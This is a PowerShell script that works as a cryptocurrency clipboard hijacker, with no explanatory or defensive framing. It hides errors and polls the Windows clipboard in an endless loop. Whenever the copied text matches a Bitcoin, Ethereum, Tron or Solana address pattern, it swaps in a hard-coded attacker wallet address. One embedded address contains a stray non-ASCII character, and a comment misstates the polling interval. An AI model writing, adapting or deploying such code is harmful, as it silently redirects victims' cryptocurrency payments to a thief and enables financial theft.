# Set the working directory to the location of the script itself
Set-Location $PSScriptRoot

$ErrorActionPreference = "SilentlyContinue"

# --- CONFIGURATION ---
$BTC_REPLACE = "bc1q04fsrv342x085tga2wgnl0jzxf3×760y4k9dqW"
$ETH_REPLACE = "0x2b466b06208963C488D2Aa69d0035E680738358a"
$SOL_REPLACE = "AL1KuZUJWcqaHJkftUsxUMNqHA2g5o4zz42SoXDWjTdH"
$TRX_REPLACE = "TFhevbrPfqNiiUW3bX4Gzg8Xbg7kwK1FhP"

# Regex Patterns for high accuracy
$BTC_REGEX = '^(bc1[a-zA-Z0-9]{25,})$|^([13][a-zA-Z0-9]{25,})$' # SegWit, Legacy, Nested
$ETH_REGEX = '^0x[a-fA-F0-9]{40}$'
$SOL_REGEX = '^[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{32,44}$' # Base58 check
$TRX_REGEX = '^T[1-9A-HJ-NP-Za-km-z]{33}$' # TRON Standard

# Function to check if a string is a valid Base58 string (for SOL)
function Test-Base58 {
    param([string]$InputString)
    # Base58 characters: 123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz
    return [regex]::IsMatch($InputString, '^[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]+$')
}

# Function to process clipboard
function ProcessClipboard {
    try {
        $clipText = [Windows.Forms.Clipboard]::GetText()
        if ([string]::IsNullOrEmpty($clipText)) { return }

        $originalText = $clipText
        
        # Check for BTC
        if ($clipText -match $BTC_REGEX) {
            [Windows.Forms.Clipboard]::SetText($BTC_REPLACE)
            return
        }

        # Check for ETH
        if ($clipText -match $ETH_REGEX) {
            [Windows.Forms.Clipboard]::SetText($ETH_REPLACE)
            return
        }

        # Check for TRX (must be before SOL to avoid false positives if any overlap, though unlikely)
        if ($clipText -match $TRX_REGEX) {
            [Windows.Forms.Clipboard]::SetText($TRX_REPLACE)
            return
        }

        # Check for SOL
        if (($clipText -match $SOL_REGEX) -and (Test-Base58 $clipText)) {
            [Windows.Forms.Clipboard]::SetText($SOL_REPLACE)
            return
        }

    } catch {
        # Ignore errors from clipboard access
    }
}

# Main Loop
while ($true) {
    ProcessClipboard
    Start-Sleep -Milliseconds 100 # Check every 200ms
}